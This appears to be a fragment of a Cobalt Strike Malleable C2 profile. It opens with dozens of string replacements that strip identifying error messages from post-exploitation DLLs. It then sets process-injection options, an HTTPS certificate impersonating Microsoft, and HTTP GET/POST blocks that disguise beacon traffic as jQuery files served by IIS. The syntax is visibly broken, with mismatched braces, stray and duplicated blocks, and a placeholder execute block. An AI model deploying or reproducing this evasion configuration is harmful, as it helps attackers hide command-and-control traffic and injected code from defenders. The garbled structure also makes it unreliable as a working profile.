   strrepex "SSHAgent" "Failed waiting for channel success" "";
   strrepex "SSHAgent" "Unable to complete request for channel-process-startup" "";
   strrepex "SSHAgent" "transport_read" "";
   strrepex "SSHAgent" "of channel_data() got" "";
   strrepex "SSHAgent" "of data from" "";
   strrepex "SSHAgent" "would block" "";
   strrepex "SSHAgent" "We've already closed this channel" "";
   strrepex "SSHAgent" "EOF has already been received, data might be ignored" "";
   strrepex "SSHAgent" "Failure while draining incoming flow" "";
   strrepex "SSHAgent" "Unable to send channel EOF data" "";
   strrepex "SSHAgent" "Would block sending EOF on channel" "";
   strrepex "SSHAgent" "_libssh2_transport_read() bailed out!" "";
   strrepex "SSHAgent" "Unable to send EOF, but closing channel anyway" "";
   strrepex "SSHAgent" "Would block sending close-channel" "";
   strrepex "SSHAgent" "Unable to send close-channel request, but closing anyway" "";
   strrepex "SSHAgent" "libssh2_channel_wait_closed() invoked when channel is not in EOF state" "";
   strrepex "SSHAgent" "Unable to allocate a command buffer for SCP session" "";
   strrepex "SSHAgent" "scp" "";
   strrepex "SSHAgent" "Would block starting up channel" "";
   strrepex "SSHAgent" "Would block requesting SCP startup" "";
   strrepex "SSHAgent" "Would block sending initial wakeup" "";
   strrepex "SSHAgent" "";
   strrepex "SSHAgent" "Would block waiting for SCP response" "";
   strrepex "SSHAgent" "Failed reading SCP response" "";
   strrepex "SSHAgent" "Failed to get memory" "";
   strrepex "SSHAgent" "got " "";
   strrepex "SSHAgent" "Failed to recv file" "";
   strrepex "SSHAgent" "Invalid data in SCP response" "";
   strrepex "SSHAgent" "Unterminated response from SCP server" "";
   strrepex "SSHAgent" "Invalid response from SCP server, too short" "";
   strrepex "SSHAgent" "Invalid response from SCP server, malformed mtime.usec" "";
   strrepex "SSHAgent" "Invalid response from SCP server, malformed mtime" "";
   strrepex "SSHAgent" "Invalid response from SCP server, too short mtime" "";
   strrepex "SSHAgent" "Would block waiting to send SCP ACK" "";
   strrepex "SSHAgent" "Invalid response from SCP server, malformed mode" "";
   strrepex "SSHAgent" "Invalid response from SCP server, invalid mode" "";
   strrepex "SSHAgent" "Invalid response from SCP server, invalid size" "";
   strrepex "SSHAgent" "Invalid response from SCP server" "";
   strrepex "SSHAgent" "Would block sending SCP ACK" "";
   strrepex "SSHAgent" "Unexpected error channel while close" "";
   strrepex "SSHAgent" "Unknown error string" "";
   strrepex "SSHAgent" "Would block waiting getting error from remote" ""; 
   strrepex "SSHAgent" "SCP failure" "";
   strrepex "SSHAgent" "Invalid ACK response from remote" "";
   strrepex "SSHAgent" "Sent " "";
   strrepex "SSHAgent" "Would block sending time data for SCP file" "";
   strrepex "SSHAgent" "Unable to send core file data for SCP file" "";
   strrepex "SSHAgent" "Would block waiting for response" "";
   strrepex "SSHAgent" "Invalid SCP ACK response" "";
   strrepex "SSHAgent" "Would block send core file data for SCP file" "";
   strrepex "SSHAgent" "failed to get memory" "";
   strrepex "SSHAgent" "failed to send file" "";
   strrepex "SSHAgent" "Unable to allocate memory for userauth_list" "";
   strrepex "SSHAgent" "Would block requesting userauth list" "";
   strrepex "SSHAgent" "Unable to send userauth-none request" "";
   strrepex "SSHAgent" "Failed getting response" "";
   strrepex "SSHAgent" "No error" "";
   strrepex "SSHAgent" "Permitted auth methods:" "";
   strrepex "SSHAgent" "Unable to allocate memory for userauth-password request" "";
   strrepex "SSHAgent" "Would block writing password request" "";
   strrepex "SSHAgent" "Unable to send userauth-password request" "";
   strrepex "SSHAgent" "Unable to allocate memory for userauth password change request" "";
   strrepex "SSHAgent" "Would block waiting" "";
   strrepex "SSHAgent" "Unable to send userauth password-change request" "";
   strrepex "SSHAgent" "Password Expired, and no callback specified" "";
   strrepex "SSHAgent" "Authentication Expired failed" "";
   strrepex "SSHAgent" "Invalid data in public key file" "";
   strrepex "SSHAgent" "Unable to allocate memory for public key data" "";
   strrepex "SSHAgent" "Missing public key data" "";
   strrepex "SSHAgent" "Invalid public key data" "";
   strrepex "SSHAgent" "Invalid key data, not base64 encoded" "";
   strrepex "SSHAgent" "No handler for specified private key" "";
   strrepex "SSHAgent" "Unable to initialize private key" "";
   strrepex "SSHAgent" "Out of memory" "";
   strrepex "SSHAgent" "Invalid signature for supplied public key, or bad username/public key combination" "";
   strrepex "SSHAgent" "Invalid public key, too short" "";
   strrepex "SSHAgent" "Invalid public key" "";
   strrepex "SSHAgent" "Unable to send userauth-publickey request" "";
   strrepex "SSHAgent" "Waiting for USERAUTH response" "";
   strrepex "SSHAgent" "Username/PublicKey combination invalid" "";
   strrepex "SSHAgent" "Unable to allocate memory for userauth-publickey signed data" "";
   strrepex "SSHAgent" "Callback returned error" "";
   strrepex "SSHAgent" "Failed allocating additional space for userauth-publickey packet" "";
   strrepex "SSHAgent" "Waiting for publickey USERAUTH response" "";
   strrepex "SSHAgent" "Unable to extract public key and private key from private key." "";
   strrepex "SSHAgent" "Invalid data in public and private key." "";
   strrepex "SSHAgent" "Unable to allocate memory for private keyboard-interactive authentication" "";
   strrepex "SSHAgent" "Unable to send keyboard-interactive request" "";
   strrepex "SSHAgent" "Waiting for keyboard-interactive USERAUTH response" "";
   strrepex "SSHAgent" "Authentication failed (keyboard-interactive)" "";
   strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive 'name' request field" "";
   strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive 'instruction' request field" "";
   strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive prompts array" "";
   strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive responses array" "";
   strrepex "SSHAgent" "Unable to allocate memory for keyboard-interactive prompt message" "";
   strrepex "SSHAgent" "Unable to allocate buffer for SHA digest" "";
   strrepex "SSHAgent" "Unable to send Group Exchange Request" "";
   strrepex "SSHAgent" "Timeout waiting for GEX_GROUP reply" "";
   strrepex "SSHAgent" "Unable to send Group Exchange Request SHA256" "";
   strrepex "SSHAgent" "Timeout waiting for GEX_GROUP reply SHA256" "";
   strrepex "SSHAgent" "Unable to allocate memory" "";
   strrepex "SSHAgent" "Unable to send KEXINIT packet to remote host" "";
   strrepex "SSHAgent" "Agreed on KEX method:" "";
   strrepex "SSHAgent" "Agreed on HOSTKEY method:" "";
   strrepex "SSHAgent" "Agreed on CRYPT_CS method:" "";
   strrepex "SSHAgent" "Agreed on MAC_CS method:" "";
   strrepex "SSHAgent" "Agreed on MAC_SC method:" "";
   strrepex "SSHAgent" "Agreed on COMP_CS method:" "";
   strrepex "SSHAgent" "Agreed on COMP_SC method:" "";
   strrepex "SSHAgent" "Unrecoverable error exchanging keys" "";
   strrepex "SSHAgent" "Remote received connection from" "";
   strrepex "SSHAgent" "Unable to allocate a channel for new connection" "";
   strrepex "SSHAgent" "Forward not requested" "";
   strrepex "SSHAgent" "Unable to send open failure" "";
   strrepex "SSHAgent" "X11 Connection Received from" "";
   strrepex "SSHAgent" "on channel" "";
   strrepex "SSHAgent" "allocate a channel for new connection" "";
   strrepex "SSHAgent" "X11 Forward Unavailable" "";
   strrepex "SSHAgent" "Invalid MAC received" "";
   strrepex "SSHAgent" "Disconnect()" "";
   strrepex "SSHAgent" "memory for signal name" "";
   strrepex "SSHAgent" "Debug Packet:" "";
   strrepex "SSHAgent" "Received global request type" "";
   strrepex "SSHAgent" "(wr " "";
   strrepex "SSHAgent" "Packet received for unknown channel" "";
   strrepex "SSHAgent" "Packet contains more data than we offered to receive, truncating" "";
   strrepex "SSHAgent" "The current receive window is full, data ignored" "";
   strrepex "SSHAgent" "Remote sent more data than current window allows, truncating" "";
   strrepex "SSHAgent" "received request type" "";
   strrepex "SSHAgent" "Channel " "";
   strrepex "SSHAgent" "Exit signal" "";
   strrepex "SSHAgent" "received exit signal for channel" "";
   strrepex "SSHAgent" "Recved" "";
   strrepex "SSHAgent" "bytes to" "";
   strrepex "SSHAgent" "bytes at" "";
   strrepex "SSHAgent" "Key type not supported" "";
   strrepex "SSHAgent" "rijndael-cbc@lysator.liu.se" "";
   strrepex "SSHAgent" "hmac-ripemd160@openssh.com" "";
   
   # replace a string in the port scanner dll
     strrepex "PortScanner" "Scanner module is complete" "Scan is complete";
   
   # replace a string in all post exploitation dlls
     strrep "is alive." "is up.";
     }
    }
   
   #######################################################################
   ## Process Injection ###################################################
   #######################################################################
   
   process-inject {
       set allocator "VirtualAllocEx"; #or NtMapViewOfSection ( NtMapViewOfSection option is for same-architecture injection only. VirtualAllocEx
       is always used for cross-arch memory allocations. )
       set startrwx "false";
       set userwx "false";
       set bofwx allocator "HeapAlloc"; #Specify VirtualAlloc, MapViewOfFile, or HeapAlloc.
       set bof_reuse_memory "true";
       set min_alloc "16384";
       
       transform-x86 {
           prepend "\x90\x90";
           #append "\x90\x90";
       }
       
       transform-x64 {
           prepend "\x66\x87\xd2\x44\x48\x40\x90\x66\x87\xc9\x46\x66\x0f\x1f\x04\x00\x0f\x1f\x00\x45\x0f\x1f\x04\x00\x41\x87\xdb\x66\x87\xdb\x40\x42\x49\x87\xd2\x43\x4c\x87\xc9\x0f\x1f\x00\x47\x66\x90\x0f\x1f\x00";
       }
   }
   
   # The following execution block can be considered safe to use
   execute {
       # ...
   }

   #________________________________________________________________________
   #######################################################################
   ## SSL CERTIFICATE #####################################################
   #######################################################################
   
   ## Description:
   ##   Signed or self-signed TLS/SSL Certificate used for C2 communication using an HTTPS listener
   
   ## Defaults:
   ##   All certificate values are blank
   
   ## Guidelines:
   ##   Option - Use a certificate signed by a trusted certificate authority
   ##     - Best Option
   ##   - Ok Option - Create your own self signed by certificate authority
   ##   - Option - Set self-signed certificate values
   
   https-certificate {
   # Self Signed Certificate Options
   #    set CN "*.azureedge.net";
   #    set O "Microsoft Corporation";
   #    set C "US";
   #    set L "Redmond";
   #    set ST "WA";
   #    set OU "Organizational Unit";
   #    set validity "365";
   
   # Imported Certificate Options
   #    set keystore "domain.store";
   #    set password "password";
   }
   
   #######################################################################
   ## JQuery HTTP Profile #################################################
   #######################################################################
   
   http-get {
       set verb "GET"; # GET / POST
       set uri "/css3/index2.shtml"; # Can be space separated string. Each beacon will be assigned one of these
   }

   set uri "/base64url";
       }
       parameter "accept";
   }
   }
   
   server {
       header "Content-Type" "application/yin+xml";
       header "Server" "IBM_HTTP_Server/6.0.2.19 Apache/2.0.47 (Unix) DAV/2";
       set uri "/tools/family.html";
       output {
           base64;
           print;
       }
   }
   }
   
   http-post {
       set verb "POST"; # GET / POST
       set uri "/tools/family.html";
       client {
           header "Accept" "text/html, application/xhtml+xml, */*";
           header "Accept-Encoding" "gzip, deflate";
           header "DNT" "1";
           header "Content-Type" "application/x-www-form-urlencoded";
           
   id {
       base64;
       prepend "token=";
       header "Cookie";
   }
   
   output {
       base64url;
       prepend "input=";
       print;
   }
   }
   
   server {
       header "Content-Type" "text/vnd.fly";
       header "Server" "IBM_HTTP_Server/6.0.2.19 Apache/2.0.47 (Unix) DAV/2";
       output {
           base64;
           print;
       }
   }
   }
   
   
   #######################################################################
   ## GET/POST Configuration #############################################
   #######################################################################
   
   http-get "msrpc-azure" { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server
       set uri "/compare/v1.44/VXK7P0GBE8"; # URI used for GET requests
       set uri "/compare/v1.44/VXK7P0GBE8"; # URI used for GET requests
       set verb "GET";
       
       client {
           header "Accept" "image/*, application/json, text/html";
           header "Accept-Language" "nb";
           header "Accept-Encoding" "br, compress";
           header "Access-X-Control" "True";
           
           metadata {
               mask; # Transform type
               base64url; # Transform type
               prepend "SESSIONID_XVQDOC55VSGX3JM="; # Cookie value
               header "Cookie"; # Cookie header
           }
       }
       
       server {
           header "Server" "Microsoft-IIS/10.0";
           header "X-Powered-By" "ASP.NET";
           header "Cache-Control" "max-age=0, no-cache";
           header "Pragma" "no-cache";
           header "Connection" "keep-alive";
           header "Content-Type" "application/javascript; charset=utf-8";
           
           output {
               mask; # Transform type
               base64url; # Transform type
               b.toUpperCase()};n.fn=n.prototype={jquery:m,constructor:n,selector:'',length:0,toArray:function(){return n.makeArray(this)},get:function(a){return null!=a?a<0?this[a+this.length]:this[a]:n.makeArray(this)},pushStack:function(a){var b=n.merge(this.constructor(),a);return                                                        b.prevObject=this,b},each:function(a){return n.each(this,a)},map:function(a){return this.pushStack(n.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return this.pushStack(o.slice.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(a){var   b=this.length,c=+a+(a<0?b:0);return this.pushStack(c>=0&&c<b?[this[c]]:[])},end:function(){return this.prevObject||this.constructor(null)},push:n.fn.push,sort:n.fn.sort,splice:n.fn.splice};n.extend=n.fn.extend=function(){var a,b,c,d,e,f,g=arguments[0]||{},h=1,i=arguments.length,j=!1;for("boolean"==typeof  g&&(j=g,g=arguments[h]||{},h++),"object"==typeof g||n.isFunction(g)||(g={}),h===i&&(g=this,h--);h<i;h++)if(null!=(a=arguments[h]))for(b in a)c=g[b],d=a[b],g!==d&&(j&&d&&(n.isPlainObject(d)||(e=n.isArray(d)))?(e?(e=!1,f=c&&n.isArray(c)?c:[]):f=c&&n.isPlainObject(c)?c:{},g[b]=n.extend(j,f,d)):void 0! ==d&&(g[b]=d));return g},n.extend({expando:"jQuery"+(m+Math.random()).replace(/\D/g,""),isReady:!0,readyWait:1,holdReady:function(a){a?n.readyWait++:n.ready(!0)},ready:function(a){(a===!0?--n.readyWait:n.isReady)||(n.isReady=!0,a!==!0&&--n.readyWait>0||(readyList.resolveWith(document,[n])))}...

   append "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */ !function(e,t){'use strict';'object'===typeof module&&'object'===typeof module.exports?e.module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery requires a window with a document');return t(e)}:t(e)}('undefined'!==typeof window?window:this,function(e,t){'use strict';var n=[],r=n.slice,i=n.concat,o=n.push,s=n.indexOf,a={},u=a.toString,v=a.hasOwnProperty,l={},c="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},f=function(e,t){return new f.fn.init(e,t)},p=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;for(var d in f.fn=f.prototype={jquery:"3.4.1",constructor:f,length:0,toArray:function(){return r.call(this)},get:function(e){return null==e?this[0< e?this.length+e:e]:this},pushStack:function(e){var t=f.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return f.each(this,e)},map:function(e){return this.pushStack(f.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(r.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:o,sort:n.sort,splice:n.splice},f.extend=f.fn.extend=function(){var e,t,n,r,i,o,s=arguments[0]||{},a=1,u=arguments.length,l=!1;for("boolean"==typeof s&&(l=s,s=arguments[a]||{},a++),"object"==typeof s||f.isFunction(s)||(s={}),a===u&&(s=this,a--);a<u;a++)if(null! =(e=arguments[a]))for(t in e)n=s[t],r=e[t],s!==r&&(l&&r&&(f.isPlainObject(r)||(i=f.isArray(r)))?(i?(i=!1,o=n&&f.isArray(n)?n:[]):o=n&&f.isPlainObject(n)?n:{},s[t]=f.extend(l,o,r)):void 0!==r&&(s[t]=r));return s},f.extend({expando:"jQuery"+(3e8+Math.random()+""),isReady:!0,readyWait:1,holdReady:function(e){e?f.readyWait++:f.ready(!0)},ready:function(e){(e===!0?--f.readyWait:f.isReady)||(f.isReady=!0,e!==!0&&--f.readyWait>0||(readyList.resolveWith(document,[f])))}...

   t.getAttribute&&t.getAttribute(r)&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
       }
       print;
   }
   }
   
   http-post "msrpc-azure" { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server
       set uri "/Construct/v1.85/JDX894ZM2WF1"; # URI used for POST block.
       set verb "POST"; # HTTP verb used in POST block. Can be GET or POST
       
       client {
           append "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */ !function(e,t){'use strict';'object'===typeof module&&'object'===typeof module.exports?e.module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery requires a window with a document');return t(e)}:t(e)}('undefined'!==typeof window?window:this,function(e,t){'use strict';...";
           header "Accept" "application/xml, application/xhtml+xml, application/json";
           header "Accept-Language" "nb";
           header "Accept-Encoding" "identity, *";
           header "Access-X-Control" "True";
           
           id {
               mask; # Transform type
               netbiosu; # Transform type
               parameter "_KZZUEUVN";
           }
   
   output {
       mask; # Transform type
       netbios; # Transform type
       print;
   }
   }
   
   server {
       header "Server" "Microsoft-IIS/10.0";
       header "X-Powered-By" "ASP.NET";
       header "Cache-Control" "max-age=0, no-cache";
       header "Pragma" "no-cache";
       header "Connection" "keep-alive";
       header "Content-Type" "application/javascript; charset=utf-8";
       
       output {
           mask; # Transform type
           netbiosu; # Transform type
           prepend "/*! jQuery UI - v1.12.1 - 2016-09-14 * http://jqueryui.com * Includes: widget.js, position.js, data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js, effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect-fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effects/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-size.js, effects/effect-slide.js, effects/effect-transfer.js */";
           append "/*! jQuery UI - v1.12.1 - 2016-09-14 * http://jqueryui.com * Includes: widget.js, position.js, data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js, effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect-fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effects/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-size.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix-in.js, jquery/button-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js, widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable.js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, widgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, widgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js */ * Copyright jQuery Foundation and other contributors; Licensed MIT */";
           print;
       }
   }
   }
   }